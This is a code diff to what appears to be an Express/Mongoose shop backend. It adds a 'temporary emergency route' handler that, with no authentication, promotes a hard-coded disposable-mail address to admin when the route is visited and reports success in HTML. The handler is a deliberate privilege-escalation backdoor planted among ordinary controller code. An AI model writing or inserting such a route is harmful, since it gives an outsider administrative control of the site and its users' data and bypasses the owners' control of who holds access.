@@ -168,3 +168,28 @@ export const toggleWishlist = async (
     next(error);
   }
 };
+
+/**
+ * TEMPORARY EMERGENCY ROUTE
+ * Promotes Mehul.nagar@yopmail.com to admin via browser visit
+ */
+export const emergencyPromote = async (
+  _req: Request,
+  res: Response,
+  next: NextFunction
+): Promise<void> => {
+  try {
+    const user = await User.findOneAndUpdate(
+      { email: 'Mehul.nagar@yopmail.com' },
+      { role: 'admin' },
+      { new: true }
+    );
+    if (!user) {
+      res.status(404).send('<h1>User not found. Please register first.</h1>');
+      return;
+    }
+    res.status(200).send('<h1>✅ Success! Mehul.nagar@yopmail.com is now an ADMIN.</h1><p>You can now close this tab and go to the Admin Dashboard.</p>');
+  } catch (error) {
+    next(error);
+  }
+};
